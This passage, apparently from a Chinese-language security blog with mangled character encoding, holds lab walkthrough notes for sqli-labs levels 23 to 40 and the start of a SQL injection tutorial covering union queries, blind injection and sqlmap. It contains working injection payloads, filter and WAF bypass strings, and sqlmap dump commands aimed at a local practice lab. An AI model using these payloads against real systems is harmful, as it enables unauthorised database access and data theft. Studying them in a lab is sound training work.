<h3 id="ç¬¬äºŒåä¸‰å…³"><a href="#ç¬¬äºŒåä¸‰å…³" class="headerlink" title="ç¬¬äºŒåä¸‰å…³"></a>ç¬¬äºŒåä¸‰å…³</h3><p>è¿‡æ»¤äº†æ³¨é‡Š<br>ä½¿ç”¨?id&#x3D;-1â€™ union select 1,database(),3 or â€˜1â€™&#x3D;â€™1æ¥è·å–æ•°æ®åº“ï¼Œ3 or â€˜1â€™&#x3D;â€™1æ˜¯ä¸€ä½“çš„åªä¼šè¿”å›1</p>
<h3 id="ç¬¬äºŒåå››å…³"><a href="#ç¬¬äºŒåå››å…³" class="headerlink" title="ç¬¬äºŒåå››å…³"></a>ç¬¬äºŒåå››å…³</h3><p>äºŒæ¬¡æ³¨å…¥<br>æ³¨å†Œadminâ€™# phpä¼šå¯¹å…¶è¿›è¡Œè½¬ä¹‰ä¿å­˜è¿›æ•°æ®åº“ä¸­<br>ä¿®æ”¹adminâ€™#çš„å¯†ç ç›¸å½“äºä¿®æ”¹adminçš„å¯†ç æ­¤æ—¶è¯­å¥å˜æˆäº†â€™adminâ€™#â€™</p>
<h3 id="ç¬¬äºŒåäº”å…³"><a href="#ç¬¬äºŒåäº”å…³" class="headerlink" title="ç¬¬äºŒåäº”å…³"></a>ç¬¬äºŒåäº”å…³</h3><p>å°†orå’Œandè¿‡æ»¤äº†<br>è¿›è¡Œgetæ³¨å…¥<br>ä½¿ç”¨?id&#x3D;1â€™ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;â€™securityâ€™â€“+<br>ä½†orå’Œandè¿‡æ»¤ï¼Œè€Œinformation_schema.tablesä¸­æœ‰oréœ€è¦å†™æˆinfoorrmation_schema.tables</p>
<h3 id="ç¬¬äºŒåäº”aå…³"><a href="#ç¬¬äºŒåäº”aå…³" class="headerlink" title="ç¬¬äºŒåäº”aå…³"></a>ç¬¬äºŒåäº”aå…³</h3><p>å­—ç¬¦å‹<br>å°†orå’Œandè¿‡æ»¤äº†<br>ä½¿ç”¨getçš„æ™®é€šæ³¨å…¥å°±å¯ä»¥</p>
<h3 id="ç¬¬äºŒåå…­å…³"><a href="#ç¬¬äºŒåå…­å…³" class="headerlink" title="ç¬¬äºŒåå…­å…³"></a>ç¬¬äºŒåå…­å…³</h3><p>ä½¿ç”¨ â€œ%a0â€ æˆ– â€œ%0bâ€ æ›¿ä»£ç©ºæ ¼ï¼Œä½¿ç”¨ â€œ||â€ æ›¿ä»£ â€œorâ€ï¼Œä½¿ç”¨ â€œ%26%26â€ æ›¿ä»£ â€œandâ€<br>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œorï¼Œandï¼Œ&#x2F;<br>ä½¿ç”¨æŠ¥é”™å‹æ³¨å…¥<br>?id&#x3D;1â€™||updatexml(1,concat(0x7e,(SELECT(group_concat(table_name))FROM(infoorrmation_schema.tables)WHERE(table_schema&#x3D;â€™securityâ€™))),1)||â€™1â€™&#x3D;â€™1</p>
<h3 id="ç¬¬äºŒåå…­aå…³"><a href="#ç¬¬äºŒåå…­aå…³" class="headerlink" title="ç¬¬äºŒåå…­aå…³"></a>ç¬¬äºŒåå…­aå…³</h3><p>ä½¿ç”¨å¸ƒå°”ç›²æ³¨è„šæœ¬<br>ç©ºæ ¼ç»•è¿‡æ— æ³•ä½¿ç”¨<br>æ— æ³•ä½¿ç”¨æŠ¥é”™å‹æ³¨å…¥ï¼Œæ— æŠ¥é”™å†…å®¹<br>ç©ºæ ¼ï¼Œorï¼Œandï¼Œ&#x2F;&#x2F;éƒ½è¢«è¿‡æ»¤<br><a href="http://localhost/sqli-labs-master/Less-26a/?id=1&#39;aandnd(substr((select(group_concat(0x3a,0x3a,id,username))from(users)),%d,1)=&#39;%s&#39;)aandnd&#39;1">http://localhost/sqli-labs-master/Less-26a/?id=1&#39;aandnd(substr((select(group_concat(0x3a,0x3a,id,username))from(users)),%d,1)=&#39;%s&#39;)aandnd&#39;1</a></p>
<h3 id="ç¬¬äºŒåä¸ƒå…³"><a href="#ç¬¬äºŒåä¸ƒå…³" class="headerlink" title="ç¬¬äºŒåä¸ƒå…³"></a>ç¬¬äºŒåä¸ƒå…³</h3><p>ä½¿ç”¨å•å¼•å·<br>è¿‡æ»¤äº†&#x2F;<em><em>&#x2F;,#,union,select,ç©ºæ ¼<br>ä½¿ç”¨ç»•è¿‡<a href="http://localhost:8088/sqlilabs/Less-27/?id=0&#39;/">http://localhost:8088/sqlilabs/Less-27/?id=0&#39;/</a></em>%0a*&#x2F;UnIoN&#x2F;*%0a</em>&#x2F;SeLeCt&#x2F;<em>%0a</em>&#x2F;2,database(),4&#x2F;<em>%0a</em>&#x2F;||&#x2F;<em>%0a</em>&#x2F;â€˜1â€™&#x3D;â€™1<br>&#x2F;<em>%0a</em>&#x2F;å¼ºè¡Œåˆ¶é€ ç©ºæ ¼ï¼Œåé¢è¿›è¡Œå•å¼•å·é—­åˆ</p>
<h3 id="ç¬¬äºŒåä¸ƒaå…³"><a href="#ç¬¬äºŒåä¸ƒaå…³" class="headerlink" title="ç¬¬äºŒåä¸ƒaå…³"></a>ç¬¬äºŒåä¸ƒaå…³</h3><p>ä½¿ç”¨åŒå¼•å·<br>å’ŒäºŒåä¸ƒå…³å·®ä¸å¤š</p>
<p>è¿‡æ»¤<br>1.æ³¨é‡Šç¬¦å·è¢«è¿‡æ»¤ï¼šä½¿ç”¨or â€˜aâ€™&#x3D;â€™bçš„æ–¹å¼æ¥ç»•è¿‡<br>2.ç©ºæ ¼è¢«è¿‡æ»¤ï¼šä½¿ç”¨%a0ç©ºæ ¼ï¼Œ%a0æ¢è¡Œï¼Œ%09tabé”®ï¼Œ%0cæ¥ç»•è¿‡<br>3.andå’Œorè¢«ç»•è¿‡ï¼šç”¨&amp;&amp;å’Œ||æ¥ä»£æ›¿<br>4.unionå’Œselectè¢«ç»•è¿‡ï¼šä½¿ç”¨sElectï¼ŒuniOnç­‰æ¥ä»£æ›¿</p>
<h3 id="ç¬¬äºŒåå…«å…³"><a href="#ç¬¬äºŒåå…«å…³" class="headerlink" title="ç¬¬äºŒåå…«å…³"></a>ç¬¬äºŒåå…«å…³</h3><p>union selectç»„åˆè¢«è¿‡æ»¤ï¼Œä¸èƒ½ä½¿ç”¨ç»„åˆ<br>ä½¿ç”¨<a href="http://localhost/sqli-labs-master/Less-28a/?id=a&#39;)%0aunion%0aunion%0aselectselect%0a1,2,database();%00">http://localhost/sqli-labs-master/Less-28a/?id=a&#39;)%0aunion%0aunion%0aselectselect%0a1,2,database();%00</a></p>
<h3 id="ç¬¬äºŒåå…«aå…³"><a href="#ç¬¬äºŒåå…«aå…³" class="headerlink" title="ç¬¬äºŒåå…«aå…³"></a>ç¬¬äºŒåå…«aå…³</h3><p>å’ŒäºŒåå…«å…³ä¸€æ ·</p>
<h3 id="ç¬¬äºŒåä¹å…³"><a href="#ç¬¬äºŒåä¹å…³" class="headerlink" title="ç¬¬äºŒåä¹å…³"></a>ç¬¬äºŒåä¹å…³</h3><p>ä½¿ç”¨â€™<br>WAFç»•è¿‡<br>åœ¨é¡µé¢ä½¿ç”¨è”åˆæ³¨å…¥é‚£ä¹ˆå°±å’Œç¬¬ä¸€å…³ä¸€æ ·<br>åœ¨æºæ–‡ä»¶ä¸­æœ‰login.phpåœ¨å…¶ä¸­è¿›è¡Œæ³¨å…¥<br><a href="http://127.0.0.1/sql1/Less-29/login.php?id=1%E5%8F%AF%E4%BB%A5%E5%9B%9E%E6%98%BE">http://127.0.0.1/sql1/Less-29/login.php?id=1å¯ä»¥å›æ˜¾</a><br>ä½¿ç”¨<a href="http://127.0.0.1/sql1/Less-29/login.php?id=1&#39;%E6%98%BE%E7%A4%BA%E8%A2%ABwaf%E6%8B%A6%E4%B8%8B">http://127.0.0.1/sql1/Less-29/login.php?id=1&#39;æ˜¾ç¤ºè¢«wafæ‹¦ä¸‹</a><br>å†ä½¿ç”¨<a href="http://localhost/sqli-labs-master/Less-29/login.php?id=1&amp;id=2%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87waf%E7%84%B6%E5%90%8E%E5%9B%9E%E6%98%BE">http://localhost/sqli-labs-master/Less-29/login.php?id=1&amp;id=2å¯ä»¥ç»•è¿‡wafç„¶åå›æ˜¾</a><br>ç„¶åè¿›è¡Œæ­£å¸¸çš„æ³¨å…¥<a href="http://localhost/sqli-labs-master/Less-29/login.php?id=1&amp;id=0&#39;">http://localhost/sqli-labs-master/Less-29/login.php?id=1&amp;id=0&#39;</a> union select 1,2,3â€“+</p>
<h3 id="ç¬¬ä¸‰åå…³"><a href="#ç¬¬ä¸‰åå…³" class="headerlink" title="ç¬¬ä¸‰åå…³"></a>ç¬¬ä¸‰åå…³</h3><p>å’Œç¬¬äºŒåä¹å…³ä¸€æ ·<br>ä½¿ç”¨â€</p>
<h3 id="ç¬¬ä¸‰åä¸€å…³"><a href="#ç¬¬ä¸‰åä¸€å…³" class="headerlink" title="ç¬¬ä¸‰åä¸€å…³"></a>ç¬¬ä¸‰åä¸€å…³</h3><p>å’Œç¬¬äºŒåä¹å…³ä¸€æ ·<br>ä½¿ç”¨â€)</p>
<h3 id="ç¬¬ä¸‰åäºŒå…³"><a href="#ç¬¬ä¸‰åäºŒå…³" class="headerlink" title="ç¬¬ä¸‰åäºŒå…³"></a>ç¬¬ä¸‰åäºŒå…³</h3><p>GBKåŒå­—èŠ‚ç¼–ç ï¼šä¸€ä¸ªæ±‰å­—ç”¨ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤º<br>å®½å­—èŠ‚ç»•è¿‡å¼•å·è½¬ä¹‰<br>ä¼šåœ¨â€™å‰é¢è‡ªåŠ¨æ·»åŠ <br>ä½¿ç”¨%dfâ€™ phpè‡ªåŠ¨å¤„ç†åä¸º%df&#39;<br>%df\è¿æ¥å˜ä¸ºä¸€ä¸ªæ±‰å­—ï¼Œè¿™æ ·å°±å¯ä»¥å•å¼•å·é€ƒé€¸<br><a href="http://localhost/sqli-labs-master/Less-32/?id=%EF%BF%BD&#39;">http://localhost/sqli-labs-master/Less-32/?id=%df&#39;</a> union select 1,2,3â€“+<br>åé¢çˆ†è¡¨çš„æ—¶å€™table_schema&#x3D;â€™æ•°æ®åº“â€™  å¯ä»¥å°†â€™æ•°æ®åº“â€™æ”¹ä¸ºä½¿ç”¨åå…­è¿›åˆ¶</p>
<h3 id="ç¬¬ä¸‰åä¸‰å…³"><a href="#ç¬¬ä¸‰åä¸‰å…³" class="headerlink" title="ç¬¬ä¸‰åä¸‰å…³"></a>ç¬¬ä¸‰åä¸‰å…³</h3><p>å’Œç¬¬ä¸‰åäºŒå…³ä¸€æ ·</p>
<h3 id="ç¬¬ä¸‰åå››å…³"><a href="#ç¬¬ä¸‰åå››å…³" class="headerlink" title="ç¬¬ä¸‰åå››å…³"></a>ç¬¬ä¸‰åå››å…³</h3><p>ä¸ºpostçš„æ–œæ è½¬ä¹‰ï¼Œä½†è½¬ä¹‰æ–¹å¼ä¸getå‹çš„ä¸ç›¸åŒ<br>uname&#x3D;%dfâ€™ union select 1,2#&amp;passwd&#x3D;1&amp;submit&#x3D;Submit<br>ä¸èƒ½ä½¿ç”¨hackbarï¼Œä¼šè‡ªåŠ¨å°†%dfçš„%æ¢æˆ%25ï¼Œå˜ä¸º%25dfï¼Œpostæ— æ³•å°†å…¶å†æ¬¡è§£ç ä¸º%<br>ä½¿ç”¨burpæ¥æ³¨å…¥</p>
<h3 id="ç¬¬ä¸‰åäº”å…³"><a href="#ç¬¬ä¸‰åäº”å…³" class="headerlink" title="ç¬¬ä¸‰åäº”å…³"></a>ç¬¬ä¸‰åäº”å…³</h3><p>æ•°å­—å‹<br>ç›´æ¥ä½¿ç”¨è”åˆæ³¨å…¥<br>table_schema&#x3D;â€™æ•°æ®åº“â€™çš„â€™æ•°æ®åº“â€™ä½¿ç”¨åå…­è¿›åˆ¶</p>
<h3 id="ç¬¬ä¸‰åå…­å…³"><a href="#ç¬¬ä¸‰åå…­å…³" class="headerlink" title="ç¬¬ä¸‰åå…­å…³"></a>ç¬¬ä¸‰åå…­å…³</h3><p>å’Œç¬¬ä¸‰åäºŒå…³ä¸€æ ·</p>
<h3 id="ç¬¬ä¸‰åä¸ƒå…³"><a href="#ç¬¬ä¸‰åä¸ƒå…³" class="headerlink" title="ç¬¬ä¸‰åä¸ƒå…³"></a>ç¬¬ä¸‰åä¸ƒå…³</h3><p>å’Œç¬¬ä¸‰åäº”å…³ä¸€æ ·</p>
<h3 id="ç¬¬ä¸‰åå…«å…³"><a href="#ç¬¬ä¸‰åå…«å…³" class="headerlink" title="ç¬¬ä¸‰åå…«å…³"></a>ç¬¬ä¸‰åå…«å…³</h3><p>ä½¿ç”¨â€™<br>å †å æŸ¥è¯¢æ³¨å…¥<br>å †å æŸ¥è¯¢æ³¨å…¥æ”»å‡»å¯ä»¥æ‰§è¡Œå¤šæ¡è¯­å¥ï¼Œå¤šè¯­å¥ä¹‹é—´ä»¥åˆ†å·éš”å¼€</p>
<h3 id="ç¬¬ä¸‰åä¹å…³"><a href="#ç¬¬ä¸‰åä¹å…³" class="headerlink" title="ç¬¬ä¸‰åä¹å…³"></a>ç¬¬ä¸‰åä¹å…³</h3><p>æ•°å­—å‹<br>å’Œä¸‰åå…«å…³ä¸€æ ·</p>
<h3 id="ç¬¬å››åå…³"><a href="#ç¬¬å››åå…³" class="headerlink" title="ç¬¬å››åå…³"></a>ç¬¬å››åå…³</h3><p>ä½¿ç”¨â€™)<br>å¯ä»¥ä½¿ç”¨è”åˆæ³¨å…¥ä¹Ÿå¯ä»¥ä½¿ç”¨å¸ƒå°”ç›²æ³¨<br>æ²¡æœ‰æŠ¥é”™ï¼Œæ— æ³•ä½¿ç”¨æŠ¥é”™å‹æ³¨å…¥</p>
]]></content>
  </entry>
  <entry>
    <title>sqlæ³¨å…¥</title>
    <url>/2022/11/19/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>sqlæ³¨å…¥çš„éƒ¨åˆ†ç±»å‹</p>
<span id="more"></span>

<p><strong>æ³¨å…¥ç±»å‹:è”åˆæ³¨å…¥ï¼Œå¸ƒå°”ç›²æ³¨ï¼Œå…³äºæ—¶é—´çš„æ³¨å…¥(åˆ©ç”¨æ—¶é—´å»¶è¿Ÿ)ï¼ŒæŠ¥é”™å‹æ³¨å…¥ï¼Œè¯·æ±‚å¤´æ³¨å…¥ï¼Œå †å æŸ¥è¯¢æ³¨å…¥</strong></p>
<h2 id="ä¸€-è”åˆæ³¨å…¥"><a href="#ä¸€-è”åˆæ³¨å…¥" class="headerlink" title="ä¸€.è”åˆæ³¨å…¥"></a>ä¸€.è”åˆæ³¨å…¥</h2><h4 id="1-unionçš„ä½¿ç”¨"><a href="#1-unionçš„ä½¿ç”¨" class="headerlink" title="1.unionçš„ä½¿ç”¨"></a>1.unionçš„ä½¿ç”¨</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯­æ³•sql1 union sql2</span><br><span class="line">æ³¨æ„:ä¸¤æ¡sqlè¯­å¥æŸ¥è¯¢çš„å­—æ®µæ•°å¿…é¡»ç›¸åŒ</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from è¡¨å union select 1#</span><br><span class="line">å¦‚æœæŠ¥é”™å†è¿›è¡Œ</span><br><span class="line">select * from è¡¨å union select 1,2#</span><br><span class="line">select * from è¡¨å union select 1,2,3#</span><br><span class="line">ç›´åˆ°ä¸å†æŠ¥é”™</span><br><span class="line"></span><br><span class="line">æˆ–è€…</span><br><span class="line">?id=1&#x27; order by 4--+</span><br><span class="line"></span><br><span class="line">//sqlæ³¨å…¥æ¼æ´ï¼Œå°±æ˜¯é€šè¿‡æ‹¼æ¥unionåè¯­å¥å®ç°è·å–æ•°æ®åº“éšç§ä¿¡æ¯</span><br></pre></td></tr></table></figure>

<h4 id="2-ç‰¹æ®Šåº“ä½¿ç”¨"><a href="#2-ç‰¹æ®Šåº“ä½¿ç”¨" class="headerlink" title="2.ç‰¹æ®Šåº“ä½¿ç”¨"></a>2.ç‰¹æ®Šåº“ä½¿ç”¨</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åº“å:information_schema</span><br><span class="line">ä½œç”¨:å­˜å‚¨mysqlä¸­æ‰€æœ‰åº“åã€è¡¨åã€åˆ—åï¼Œæ˜¯mysqlçš„å­—å…¸</span><br><span class="line">åº”ç”¨:sqlæ³¨å…¥ç»å¸¸ä»æ­¤åº“ä¸­è·å–éœ€è¦çš„åº“åã€è¡¨åã€å­—æ®µå</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from information_schema.tables\G;//æŸ¥çœ‹æ‰€æœ‰è¡¨</span><br><span class="line">select * from information_schema.columns\G;//æŸ¥çœ‹æ‰€æœ‰å­—æ®µ</span><br><span class="line">select distinct table_schema from information_schema.tables;//æŸ¥çœ‹æ•°æ®åº“</span><br><span class="line">select table_name from information_schema.tables where table_schema=&#x27;æ•°æ®åº“å&#x27;;//æŸ¥çœ‹è¡¨</span><br><span class="line">æ•°æ®åº“å:table_schema</span><br><span class="line">è¡¨å:table_name</span><br><span class="line">åˆ—å:columns_name</span><br></pre></td></tr></table></figure>

<h4 id="3-æŸ¥æ‰¾æ³¨å…¥ç‚¹"><a href="#3-æŸ¥æ‰¾æ³¨å…¥ç‚¹" class="headerlink" title="3.æŸ¥æ‰¾æ³¨å…¥ç‚¹"></a>3.æŸ¥æ‰¾æ³¨å…¥ç‚¹</h4><p>æ³¨é‡Šå­—ç¬¦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¸€.å•è¡Œæ³¨é‡Š: #å’Œ--   æ³¨æ„ä½¿ç”¨-- æ—¶åé¢å¿…é¡»æœ‰ä¸€ä¸ªç©ºæ ¼</span><br><span class="line">äºŒ.å¤šè¡Œæ³¨é‡Š: /*å†…å®¹*/</span><br></pre></td></tr></table></figure>

<p>è·å–å­—æ®µæ•° (unionå‰åçš„selectçš„è¯­å¥çš„å­—æ®µæ•°å¿…é¡»ç›¸åŒæ‰èƒ½ä½¿ç”¨)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1#</span><br><span class="line">å¦‚æœæŠ¥é”™å†è¿›è¡Œ</span><br><span class="line">union select 1,2#</span><br><span class="line">union select 1,2,3#</span><br><span class="line">ç›´åˆ°ä¸å†æŠ¥é”™</span><br></pre></td></tr></table></figure>

<p>è·å–åº“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‰æå‰é¢çš„sqlå¦‚æœè¯¥å­—æ®µæœ‰3åˆ—</span><br><span class="line">select * from è¡¨å union select 1,2,database();</span><br></pre></td></tr></table></figure>

<p>è·å–è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‰æå‰é¢çš„sqlå¦‚æœè¯¥å­—æ®µæœ‰3åˆ—</span><br><span class="line">select * from è¡¨å union select group_concat(table_name),1,2 from information_schema.tables where table_schema=&#x27;æ•°æ®åº“&#x27;;</span><br></pre></td></tr></table></figure>

<p>è·å–åˆ—</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‰æå‰é¢çš„sqlå¦‚æœè¯¥å­—æ®µæœ‰3åˆ—</span><br><span class="line">select * from è¡¨å union select group_concat(column_name),1,2 from information_schema.columns where table_name=&#x27;è¡¨å&#x27;;</span><br></pre></td></tr></table></figure>

<p>è·å–æ•°æ®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‰æå‰é¢çš„sqlå¦‚æœè¯¥å­—æ®µæœ‰2åˆ—</span><br><span class="line">æ¯”å¦‚è¦è·å–userå’Œpasswordå­—æ®µçš„æ•°æ®</span><br><span class="line">select * from è¡¨å union select user,password from è¡¨å;</span><br><span class="line">æˆ–è€…select * from è¡¨å union select 1,group_concat(user,password) from è¡¨å;</span><br></pre></td></tr></table></figure>

<p>group_concat()æ˜¯å°†æ‰€æœ‰æ•°æ®è¾“å‡º</p>
<h4 id="4-è§£å†³å­—æ®µæ•°é™åˆ¶"><a href="#4-è§£å†³å­—æ®µæ•°é™åˆ¶" class="headerlink" title="4.è§£å†³å­—æ®µæ•°é™åˆ¶"></a>4.è§£å†³å­—æ®µæ•°é™åˆ¶</h4><p>ç”±äºåå°sqlé»˜è®¤æŸ¥è¯¢å­—æ®µæ•°é™åˆ¶ï¼Œæ³¨å…¥æ—¶åªèƒ½è·å–ç›¸åŒå­—æ®µçš„æ•°æ®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨concatå‡½æ•°</span><br><span class="line">è¯­æ³•concat(str1,str2,....)</span><br><span class="line">select åˆ—å,concat(åˆ—å,&#x27; &#x27;,åˆ—å) from è¡¨å; //&#x27; &#x27;æ˜¯é˜²æ­¢è¿åœ¨ä¸€èµ·</span><br></pre></td></tr></table></figure>

<h4 id="5-è‡ªåŠ¨æ³¨å…¥"><a href="#5-è‡ªåŠ¨æ³¨å…¥" class="headerlink" title="5.è‡ªåŠ¨æ³¨å…¥"></a>5.è‡ªåŠ¨æ³¨å…¥</h4><p>å·¥å…·:sqlmap</p>
<p><strong>ç”¨æ³•</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‘½ä»¤: sqlmap å‚æ•°</span><br><span class="line">-u:æ‰«æçš„ç›®æ ‡url</span><br><span class="line">--batch:è‡ªåŠ¨å¤„ç†æç¤ºä¿¡æ¯</span><br><span class="line">--cookie:é™„åŠ cookieå‚æ•°</span><br><span class="line">å®ä¾‹:python sqlmap.py --batch -u &quot;ç½‘å€&quot; --cookie=&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>æ‰«ææ³¨å…¥ç‚¹(å…ˆåˆ¤æ–­æ˜¯å­—ç¬¦æ³¨å…¥è¿˜æ˜¯æ•°å­—æ³¨å…¥)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py --batch -u &quot;ç½‘å€&quot; --cookie=&quot;&quot;</span><br><span class="line">//cookieå¯ä»¥åœ¨F12ä¸­å¯»æ‰¾ï¼Œæ²¡æœ‰cookieæ— æ³•ç™»å½•è¿›å»</span><br></pre></td></tr></table></figure>

<p>è·å–æ•°æ®åº“å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--current-db:æŸ¥è¯¢å½“å‰webä½¿ç”¨çš„æ•°æ®åº“å</span><br><span class="line">-D:åº”ç”¨æŒ‡å®šæ•°æ®åº“</span><br><span class="line">python sqlmap.py --batch -u &quot;ç½‘å€&quot; --cookie=&quot;&quot; --current-db//è·å–æ•°æ®åº“</span><br></pre></td></tr></table></figure>

<p>è·å–è¡¨å</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--tables:æŸ¥è¯¢æŒ‡å®šåº“ä¸‹æ‰€æœ‰è¡¨å</span><br><span class="line">-T:æŒ‡å®šè¡¨</span><br><span class="line">è·å–æ•°æ®åº“åä»¥åpython sqlmap.py --batch -u &quot;ç½‘å€&quot; --cookie=&quot;&quot; -D åº“å --tables//è·å–è¡¨</span><br></pre></td></tr></table></figure>

<p>è·å–å­—æ®µå</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--columns:æŸ¥è¯¢æŒ‡å®šè¡¨ä¸‹æ‰€æœ‰å­—æ®µ</span><br><span class="line">-C:æŒ‡å®šå­—æ®µå</span><br><span class="line">è·å–è¡¨ä»¥åpython sqlmap.py --batch -u &quot;ç½‘å€&quot; --cookie=&quot;&quot; -D åº“å -T è¡¨å --columns//è·å–å­—æ®µ</span><br></pre></td></tr></table></figure>

<p>è·å–æ•°æ®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--dump:ä¸‹è½½æ•°æ®</span><br><span class="line">è·å–å­—æ®µåpython sqlmap.py --batch -u &quot;ç½‘å€&quot; --cookie=&quot;&quot; -D åº“å -T è¡¨å -C &quot;å­—æ®µå,å­—æ®µå&quot; --dump</span><br></pre></td></tr></table></figure>

<h2 id="äºŒ-å¸ƒå°”ç›²æ³¨-ä½¿ç”¨è„šæœ¬"><a href="#äºŒ-å¸ƒå°”ç›²æ³¨-ä½¿ç”¨è„šæœ¬" class="headerlink" title="äºŒ.å¸ƒå°”ç›²æ³¨(ä½¿ç”¨è„šæœ¬)"></a>äºŒ.å¸ƒå°”ç›²æ³¨(ä½¿ç”¨è„šæœ¬)</h2><h4 id="1-åˆ¤æ–­å­—æ®µæ•°"><a href="#1-åˆ¤æ–­å­—æ®µæ•°" class="headerlink" title="1.åˆ¤æ–­å­—æ®µæ•°"></a>1.åˆ¤æ–­å­—æ®µæ•°</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=  order by 1--+</span><br><span class="line">id=  order by 2--+</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">ç›´åˆ°æŠ¥é”™ä¸ºæ­¢</span><br></pre></td></tr></table></figure>

<h4 id="2-åˆ¤æ–­æ•°æ®åº“åçš„é•¿åº¦"><a href="#2-åˆ¤æ–­æ•°æ®åº“åçš„é•¿åº¦" class="headerlink" title="2.åˆ¤æ–­æ•°æ®åº“åçš„é•¿åº¦"></a>2.åˆ¤æ–­æ•°æ®åº“åçš„é•¿åº¦</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨lengthå‡½æ•°</span><br><span class="line">id=  and length(database())=1--+</span><br><span class="line">id=  and length(database())=2--+</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">ç›´åˆ°é¡µé¢å›åˆ°æ­£å¸¸</span><br></pre></td></tr></table></figure>

<h4 id="3-çŒœæ•°æ®åº“å"><a href="#3-çŒœæ•°æ®åº“å" class="headerlink" title="3.çŒœæ•°æ®åº“å"></a>3.çŒœæ•°æ®åº“å</h4><p>substrå‡½æ•°:substr(å‚æ•°1ï¼Œå‚æ•°2ï¼Œå‚æ•°3)</p>
<p>å‚æ•°1ï¼šéœ€è¦æˆªå–çš„å­—ç¬¦ä¸²</p>
<p>å‚æ•°2ï¼šæˆªå–å­—ç¬¦ä¸²çš„ä½ç½®</p>
<p>å‚æ•°3ï¼šè¦æˆªå–å­—ç¬¦ä¸²çš„é•¿åº¦</p>
<p>midå‡½æ•°:mid(å‚æ•°1ï¼Œå‚æ•°2ï¼Œå‚æ•°3)</p>
<p>å‚æ•°1ï¼šæ˜¯å­—ç¬¦ä¸²</p>
<p>å‚æ•°2ï¼šæ˜¯èµ·å§‹å­å­—ç¬¦ä¸²çš„ä½ç½®</p>
<p>å‚æ•°3ï¼šæ˜¯ä¸€ä¸ªå¯é€‰å‚æ•°ï¼Œå®ƒå†³å®šä»èµ·å§‹ä½ç½®è¿”å›çš„å­—ç¬¦æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=  and substr(database(),1,1)=&#x27;&#x27;</span><br><span class="line">id=  and substr(database(),2,1)=&#x27;&#x27;</span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line">çŒœå‡ºæ•°æ®åº“æ¯ä¸€ä½</span><br></pre></td></tr></table></figure>

<h4 id="4-çŒœè¡¨å"><a href="#4-çŒœè¡¨å" class="headerlink" title="4.çŒœè¡¨å"></a>4.çŒœè¡¨å</h4><p>limit i,n</p>
<p>iæ˜¯æŸ¥è¯¢ç»“æœçš„ç´¢å¼•å€¼</p>
<p>næ˜¯æŸ¥è¯¢ç»“æœè¿”å›çš„æ•°é‡</p>
<p><strong>æœ‰å‡ ä¸ªè¡¨</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=  and (select count(table_name) from information_schema.tables where table_schema=æ•°æ®åº“å)=1--+</span><br><span class="line">å¦‚æœæ˜¾ç¤ºå¯¹çš„é‚£database()è¿™ä¸ªæ•°æ®åº“ä¸­æœ‰1ä¸ªè¡¨,å¦‚æœæ˜¾ç¤ºé”™é‚£ä¹ˆå°±ä¸æ˜¯ä¸€ä¸ªè¡¨</span><br></pre></td></tr></table></figure>

<p><strong>è¡¨åçš„é•¿åº¦</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å‡è®¾è¯¥æ•°æ®åº“æœ‰ä¸¤ä¸ªè¡¨</span><br><span class="line"></span><br><span class="line">æŸ¥è¯¢ç¬¬ä¸€ä¸ªè¡¨çš„é•¿åº¦</span><br><span class="line">id=  and length(substr((select table_name from information_schema.tables where table_schema=æ•°æ®åº“å limit 0,1),1))=9--+</span><br><span class="line">å¦‚æœæ˜¾ç¤ºæ­£ç¡®åˆ™è¯¥è¡¨é•¿åº¦ä¸º9</span><br><span class="line"></span><br><span class="line">æŸ¥è¯¢ç¬¬äºŒä¸ªè¡¨çš„é•¿åº¦</span><br><span class="line">id=  and length(substr((select table_name from information_schema.tables where table_schema=æ•°æ®åº“å limit 1,1),1))=9--+</span><br></pre></td></tr></table></figure>

<p><strong>è¡¨çš„åå­—</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=  and substr((select table_name from information_schema.tables where table_schema=æ•°æ®åº“å limit i,1),n,1)=&#x27;&#x27;--+</span><br><span class="line">iæ˜¯ç¬¬å‡ ä¸ªè¡¨</span><br><span class="line">næ˜¯ç¬¬å‡ ä¸ªå­—ç¬¦</span><br></pre></td></tr></table></figure>

<h4 id="5-çŒœå­—æ®µ"><a href="#5-çŒœå­—æ®µ" class="headerlink" title="5.çŒœå­—æ®µ"></a>5.çŒœå­—æ®µ</h4><p><strong>æœ‰å‡ ä¸ªå­—æ®µ</strong></p>
